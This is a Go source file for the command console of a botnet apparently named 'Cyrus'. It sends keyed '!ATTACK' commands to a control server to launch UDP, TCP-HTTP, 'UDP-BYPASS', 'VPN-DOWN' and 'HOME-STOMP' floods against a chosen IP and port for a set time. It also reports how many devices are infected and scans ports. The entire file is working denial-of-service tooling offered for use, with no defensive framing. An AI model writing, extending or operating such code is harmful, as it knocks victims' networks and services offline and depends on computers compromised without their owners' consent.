package main

import (
	"botnet/server/utils"
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func get_connected_socket() net.Conn {
	conn, err := net.Dial("tcp", "0.0.0.0:9999")

	if err != nil {
		fmt.Println("Failure creating socket")
		panic(err)
	}
	return conn
}

func menu() {

	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
	fmt.Print("\033[1;33m")
	indent := "		               "
	fmt.Printf("%s┌─┐┬ ┬┬─┐┬ ┬┌─┐\n", indent)
	fmt.Printf("%s│  └┬┘├┬┘│ │└─┐\n", indent)
	fmt.Printf("%s└─┘ ┴ ┴└─└─┘└─┘\n\n\n	    	         Welcome to the \033[4;36m𝑪𝒀𝑹𝑼𝑺\033[0m\033[1;33m Botnet.\033[1;33m\n	    	    You are \033[4;31mNOT\033[0m\033[1;33m limited to concurrent attacks.\n	    	         Type \033[4;31mhelp\033[0m\033[1;33m to view commands.\n\n", indent)
}

func parse_methods_command(conn net.Conn, args []string) {

	response := ""
	var command []byte
	switch strings.ToUpper(args[0]) {
	case "UDP":
		if len(args) != 5 {
			fmt.Println("\033[1;37mUsage: UDP [IP] [PORT] 1024 [TIME]")
			break
		}
		command = []byte(fmt.Sprintf("!ATTACK %s %s %s %s %s %s", utils.ATTACK_KEY, args[1], args[2], args[3], args[4], "udp"))
		break
	case "TCP-HTTP": // IP PORT TIME METHOD
		if len(args) != 4 {
			fmt.Println("\033[1;37mUsage: TCP-HTTP [IP] [PORT] [TIME]")
			break
		}
		args = append(args, "tcp")
		command = []byte(fmt.Sprintf("!ATTACK %s %s %s %s %s %s", utils.ATTACK_KEY, args[1], args[2], args[3], "tcp", "tcp-http"))
		break
	case "UDP-BYPASS":
		if len(args) != 7 {
			fmt.Println("\033[1;37mUsage: UDP-BYPASS [RPC] [THREADS] [IP] [PORT] 1024 [TIME]")
			break
		}
		command = []byte(fmt.Sprintf("!ATTACK %s %s %s %s %s %s %s %s", utils.ATTACK_KEY, args[1], args[2], args[3], args[4], args[5], args[6], "udp-bypass"))
		break
	case "VPN-DOWN": // tc, ip, port, pps, time
		if len(args) != 6 {
			fmt.Println(len(args))
			break
		}
		command = []byte(fmt.Sprintf("!ATTACK %s %s %s %s %s %s %s", utils.ATTACK_KEY, args[1], args[2], args[3], args[4], args[5], "vpn-down"))
		break
	case "HOME-STOMP": // ip port psize time threads rpc
		if len(args) != 7 {
			fmt.Println(len(args))
			fmt.Println("\033[1;37mUsage: UDP [IP] [PORT] 1024 [TIME]")
			break
		}
		command = []byte(fmt.Sprintf("!ATTACK %s %s %s %s %s %s %s %s", utils.ATTACK_KEY, args[1], args[2], args[3], args[4], args[5], args[6], "home-stomp"))
		break
	case "STOP":
		if len(args) != 2 {
			fmt.Println(len(args))
			break
		}
		command = []byte(fmt.Sprintf("!ATTACK %s %s %s", utils.ATTACK_KEY, args[1], "stop"))
	}
	fmt.Println(string(command))
	if utils.Check_params(conn, utils.ATTACK_KEY, args) {
		conn.Write(command)
		response = utils.Get_msg(conn)
		bl, _ := regexp.Match(`Sent commands to \d bots`, []byte(response))
		if bl {
			fmt.Printf("\033[1;31m[\033[1;37m+\033[1;31m] \033[0;97m%s\n", response)
		} else {
			fmt.Printf("\033[1;31m[\033[1;37m-\033[1;31m] \033[0;97m%s\n", response)
		}
	} else {
		fmt.Println("Invalid args.")
	}

	conn.Close()
}
func register_command(conn net.Conn, command string) {
	spl := strings.Split(command, " ")
	switch strings.ToLower(spl[0]) {

	case "menu":
		menu()
		break
	case "botcount":
		reply := make([]byte, 1024)
		conn.Write([]byte("!bot_count"))
		_, err := conn.Read(reply)
		if err != nil {
			fmt.Println("Error occured while sending command to server")
		}
		fmt.Printf("\033[1;31m[\033[1;37mDEVICES INFECTED\033[1;31m]\033[1;37m: %s\n", string(reply))
		break

	case "scan":
		if len(spl) != 3 {
			fmt.Println("\033[1;31m[\033[1;37m-\033[1;31m]\033[1;37m SCAN [IP] [PORT]")
			break
		}
		if !utils.Valid_ip(spl[1]) {
			fmt.Println("Invalid IP.")
			break
		}
		port, err := strconv.Atoi(spl[2])
		if err != nil {
			fmt.Println("Invalid port")
			break
		} else if port <= 0 || port > 65535 {
			fmt.Println("Port ranges are 1-65535")
			break
		}

		if utils.ScanPort(spl[1], port) {
			fmt.Printf("\033[1;31m[\033[1;37mINFO\033[1;31m]\033[1;37m Port %d is open.\n", port)
		} else {
			fmt.Printf("\033[1;31m[\033[1;37mINFO\033[1;31m]\033[1;37m Port %d is closed.\n", port)
		}
		break
	case "help":
		fmt.Print("\n\033[1;31m[\033[1;37mHELP\033[1;31m]\033[1;37m ~ Displays this message\n\033[1;31m[\033[1;37mSCAN\033[1;31m]\033[1;37m ~ Scan an IP for open ports\n\033[1;31m[\033[1;37mBOTCOUNT\033[1;31m]\033[1;37m ~ Outputs devices infected\n\033[1;31m[\033[1;37mMETHODS\033[1;31m]\033[1;37m ~ Displays attack methods\n\n")
		break
	case "methods":
		fmt.Print("\n\n\033[1;31m[\033[1;37mMETHODS\033[1;31m]:		\n\n\033[1;37m !* UDP [IP] [PORT] 1024 [TIME]\n !* TCP [IP] [PORT] 1024 [OSI] [THREADS] [TIME]\n !* HOME-FREEZE [IP] [PORT] 1024 [TIME] [THREADS]\n !* VPN-DOWN [THREADS] [IP] [PORT] 1024 [TIME]\n !* TCP-HTTP [IP] [PORT] [TIME]\n !* UDP-BYPASS [RPC] [THREADS] [IP] [PORT] 1024 [TIME]\n !* HOME-STOMP [IP] [PORT] [PSIZE] [TIME] [THREADS] [RPC]\n !* STOP [IP]\n\n")
		break
	default:
		command_unrecognized := true
		for v := range utils.VALID_METHODS {
			if utils.VALID_METHODS[v] == strings.ToUpper(spl[0]) {
				command_unrecognized = false
				parse_methods_command(conn, spl)
				break
			}
		}
		if command_unrecognized {
			fmt.Println("Unrecognized command.")
		}
		break
	}
	conn.Close()
}

func main() {
	fmt.Print("\033]0;cyrus botnet\007")
	menu()
	for {
		fmt.Print("\033[1;31mroot\033[37m@\033[1;31mcyrus:\033[0m ")
		var cmd string
		scanner := bufio.NewScanner(os.Stdin)

		if scanner.Scan() {
			cmd = scanner.Text()
		}

		conn := get_connected_socket()
		register_command(conn, cmd)
		time.Sleep(time.Millisecond * 150)
	}
}
